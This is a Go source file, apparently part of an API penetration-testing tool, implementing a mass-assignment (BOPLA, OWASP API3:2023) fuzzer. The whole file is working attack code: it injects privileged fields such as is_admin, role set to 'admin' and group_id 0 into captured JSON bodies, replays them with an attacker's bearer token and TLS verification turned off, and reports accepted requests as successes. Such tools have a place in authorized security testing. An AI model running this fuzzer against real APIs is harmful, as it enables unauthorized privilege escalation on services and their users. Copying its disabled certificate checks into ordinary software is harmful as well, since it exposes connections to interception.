package logic

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/pterm/pterm"
)

// BOPLAContext defines the target and the base payload to fuzz
type BOPLAContext struct {
	TargetURL string
	Method    string // Usually PATCH or PUT
	BaseJSON  string // The valid JSON body captured from the proxy
}

// Common administrative properties to inject for API3
var administrativeKeys = []string{
	"is_admin", "isAdmin", "role", "privileges", "status", "verified", 
	"permissions", "group_id", "internal_flags", "account_type",
}

func (b *BOPLAContext) Fuzz() {
	pterm.DefaultHeader.WithFullWidth(false).Println("BOPLA / Mass Assignment Fuzzer (API3:2023)")

	// Fallback to global attacker token
	activeToken := CurrentSession.AttackerToken
	if activeToken == "" {
		pterm.Warning.Println("No Attacker Token configured. Probing without Authorization header...")
	}

	client := &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	for _, key := range administrativeKeys {
		pterm.Info.Printf("Probing property: [%s]\n", key)

		// 1. Unmarshal the base JSON provided by the user
		var data map[string]interface{}
		err := json.Unmarshal([]byte(b.BaseJSON), &data)
		if err != nil {
			pterm.Error.Printf("Invalid Base JSON provided: %v\n", err)
			return
		}

		// 2. Inject the malicious property
		data[key] = true 
		if key == "role" { data[key] = "admin" }
		if key == "group_id" { data[key] = 0 }

		payload, _ := json.Marshal(data)

		// 3. Prepare and Send Request
		req, _ := http.NewRequest(b.Method, b.TargetURL, bytes.NewBuffer(payload))
		req.Header.Set("Content-Type", "application/json")
		if activeToken != "" {
			req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", activeToken))
		}

		resp, err := client.Do(req)
		if err != nil {
			pterm.Error.Printf("Request failed for %s: %v\n", key, err)
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)

		// 4. Analysis: If 200 OK, the server likely accepted the forbidden property
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusNoContent {
			pterm.Warning.Prefix = pterm.Prefix{Text: "VULN", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
			pterm.Warning.Printf("BOPLA SUCCESS: Key [%s] accepted by server (Status: %d)\n", key, resp.StatusCode)
			
			if len(body) > 0 {
				pterm.Info.Printf("Server Reflection: %s\n", string(body))
			}
		} else {
			pterm.Info.Printf("Property [%s] rejected (Status: %d)\n", key, resp.StatusCode)
		}
	}
}